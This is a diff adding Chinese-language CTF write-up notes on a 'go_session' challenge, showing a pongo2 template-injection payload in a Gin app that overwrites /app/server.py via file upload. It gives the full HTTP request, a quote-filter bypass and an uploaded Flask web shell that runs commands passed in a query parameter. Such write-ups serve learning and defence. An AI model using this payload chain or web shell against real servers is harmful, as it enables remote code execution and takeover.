@@ -39,7 +39,68 @@ sql注入发现没有flag
 ---
 
 ### go_session
+#go 
+#SSTI 
 
+pongo2的ssti,语法与django一致,使用gin框架上传文件覆盖flask服务
+
+```
+{{c.SaveUploadedFile(c.FormFile("file"),"/app/server.py")}}
+```
+
+获取表单名为file的文件保存到/app/server.py这个路径
+但是不能存在",因为有html编码
+Context.HandlerName()
+
+> HandlerName 返回主处理程序的名称。例如，如果处理程序是“handleGetUsers()”，此函数将返回“main.handleGetUsers”。
+> 配合过滤器last获取到最后一个字符串
+> 
+> Context.Request.Referer()
+> 返回header里的Referer的值
+```
+{{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}
+```
+
+
+构造一个上传表单
+```http
+GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}} HTTP/1.1
+Host: node1.anna.nssctf.cn:28311
+Referer: /app/server.py
+Content-Length: 426
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.195.3.12:88
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Cookie: session-name=MTY4NTc5Mjc3OXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxLpnBBgvTJ3SvEgKjI7S0g36QPYe_S4TYV_epZAUggJA==
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.195.3.12:88/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundary8ALIn5Z2C3VlBqND
+Content-Disposition: form-data; name="n"; filename="1.py"
+Content-Type: text/plain
+
+from flask import *
+import os
+app = Flask(__name__)
+
+
+@app.route('/')
+def index():
+    name = request.args['name']
+    file=os.popen(name).read()
+    return file
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
+------WebKitFormBoundary8ALIn5Z2C3VlBqND--
+
+```
 
 ### DeserBug
 #java
